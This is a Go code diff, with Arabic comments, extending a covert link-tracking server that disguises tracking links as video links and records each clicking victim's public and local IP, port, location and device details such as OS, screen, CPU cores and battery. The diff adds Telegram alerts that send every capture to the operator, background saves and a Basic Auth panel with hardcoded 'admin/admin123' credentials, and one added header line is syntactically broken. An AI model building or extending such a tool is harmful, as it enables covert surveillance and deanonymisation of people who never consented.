@@ -7,6 +7,7 @@ import (
 	"html/template"
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -14,6 +15,14 @@ import (
 )
 
 var db *sql.DB
+
+// قم بتعديل هذه القيم إذا أردت تخصيص بيانات الدخول وتنبيهات تيليجرام
+const (
+	AdminUser   = "admin"
+	AdminPass   = "admin123"
+	TelegramBotToken = "" // ضع توكن بوت تيليجرام هنا إن أردت (اختياري)
+	TelegramChatID   = "" // ضع معرف الشات الخاص بك هنا (اختياري)
+)
 
 type Capture struct {
 	ID         int
@@ -33,7 +42,7 @@ type PageData struct {
 
 func initDB() {
 	var err error
-	db, err = sql.Open("sqlite", "./long_term_tracker.db")
+	db, err = sql.Open("sqlite", "./secure_tracker.db")
 	if err != nil {
 		panic(err)
 	}
@@ -139,9 +148,24 @@ func getISPAndLocation(ip string, ua string) string {
 	return "Algeria (Trace)"
 }
 
+func sendTelegramAlert(message string) {
+	if TelegramBotToken == "" || TelegramChatID == "" {
+		return
+	}
+	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TelegramBotToken)
+	resp, err := http.PostForm(apiURL, url.Values{
+		"chat_id": {TelegramChatID},
+		"text":    {message},
+	})
+	if err == nil {
+		resp.Body.Close()
+	}
+}
+
 func mainHandler(w http.ResponseWriter, r *http.Request) {
 	code := r.URL.Query().Get("r")
 
+	// معالجة زيارات الروابط وتتبع الأهداف
 	if code != "" {
 		var targetURL string
 		err := db.QueryRow("SELECT target_url FROM links WHERE code = ?", code).Scan(&targetURL)
@@ -159,8 +183,10 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		if isBot {
 			publicIP := getRealIP(r)
 			location := getISPAndLocation(publicIP, ua)
-			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-				code, publicIP, "Bot", "N/A", location, "🤖 [Bot] UA: "+ua[:30])
+			go func() {
+				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
+					code, publicIP, "Bot", "N/A", location, "🤖 [Bot] UA: "+ua[:30])
+			}()
 
 			w.Header().Set("Content-Type", "text/html; charset=utf-8")
 			fmt.Fprintf(w, `<!DOCTYPE html><html><head><meta property="og:title" content="Video"><meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600"></head><body></body></html>`)
@@ -180,8 +206,14 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			deviceInfo := fmt.Sprintf("OS: %s | Screen: %s | Cores: %s | Battery: %s",
 				r.FormValue("platform"), r.FormValue("screen"), r.FormValue("hardware"), r.FormValue("battery"))
 
-			db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
-				code, publicIP, localIP, port, location, deviceInfo)
+			// تنفيذ الحفظ وإرسال التنبيه في الخلفية (Goroutine) لضمان السرعة المطلقة
+			go func() {
+				db.Exec("INSERT INTO captures (code, public_ip, local_ip, port, location, device_info) VALUES (?, ?, ?, ?, ?, ?)",
+					code, publicIP, localIP, port, location, deviceInfo)
+				
+				alertMsg := fmt.Sprintf("🚨 [New Capture]\nCode: %s\nIP: %s\nLocal: %s\nLoc: %s\nInfo: %s", code, publicIP, localIP, location, deviceInfo)
+				sendTelegramAlert(alertMsg)
+			}()
 
 			w.WriteHeader(http.StatusOK)
 			w.Write([]byte("OK"))
@@ -249,6 +281,14 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
+	// حماية لوحة التحكم باستخدام Basic Authentication
+	user, pass, ok := r.BasicAuth()
+	if !ok || user != AdminUser || pass != AdminPass {
+		w.Header().Set("WWW-Authenticate`, `Basic realm=\"Restricted Terminal\"")
+		http.Error(w, "Unauthorized access restricted.", http.StatusUnauthorized)
+		return
+	}
+
 	var generatedLink string
 	if r.Method == http.MethodPost {
 		r.ParseForm()
@@ -296,7 +336,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Code Terminal - Intelligence</title>
+    <title>Secure Terminal - Intelligence</title>
     <style>
         body { 
             background-color: #0d1117; 
@@ -327,11 +367,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
             font-family: 'Courier New', Courier, monospace;
             box-sizing: border-box; 
         }
-        input[type="text"]:focus {
-            border-color: #58a6ff;
-            outline: none;
-            box-shadow: 0 0 5px rgba(88, 166, 255, 0.4);
-        }
         button { 
             background: #238636; 
             color: #fff; 
@@ -359,7 +394,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
             padding: 6px; 
             font-size: 11px; 
         }
-        .copy-btn:hover { background: #388bfd; }
         .table-wrap { width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
         table { width: 100%; min-width: 550px; border-collapse: collapse; margin-top: 8px; font-size: 11px; font-family: 'Courier New', Courier, monospace; }
         th, td { border: 1px solid #30363d; padding: 6px; text-align: center; white-space: nowrap; }
@@ -376,15 +410,15 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 </head>
 <body>
     <div class="box">
-        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [SECURE SYSTEM] - توليد رابط تتبع بررمز مخصص</h3>
         <form method="POST">
             <input type="text" name="target_url" placeholder="target_url (tiktok.com/...)" required autocomplete="off">
             <input type="text" name="custom_code" placeholder="custom_tracking_code (optional)" autocomplete="off">
-            <button type="submit">generate_link()</button>
+            <button type="submit">generate_secure_link()</button>
         </form>
         {{if .GeneratedLink}}
         <div class="result">
-            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Link:</span><br>
+            <span style="font-size:11px; color:#3fb950; font-weight:bold;">Active Secure Link:</span><br>
             <span id="genLink" style="color: #58a6ff; font-size: 12px;">{{.GeneratedLink}}</span>
             <button type="button" class="copy-btn" onclick="copyLink()">copy_to_clipboard</button>
         </div>
@@ -392,7 +426,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
     </div>
 
     <div class="box">
-        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات</h3>
+        <h3 style="margin-top:0; font-size:13px; color:#58a6ff;">// [DATABASE] - سجلات الاستخبارات المشفرة</h3>
         <div class="table-wrap">
             <table>
                 <tr>
@@ -428,6 +462,6 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 func main() {
 	initDB()
 	http.HandleFunc("/", mainHandler)
-	fmt.Println("[*] Terminal Server running on port 8080...")
+	fmt.Println("[*] Secure Terminal Server running on port 8080...")
 	http.ListenAndServe(":8080", nil)
 }
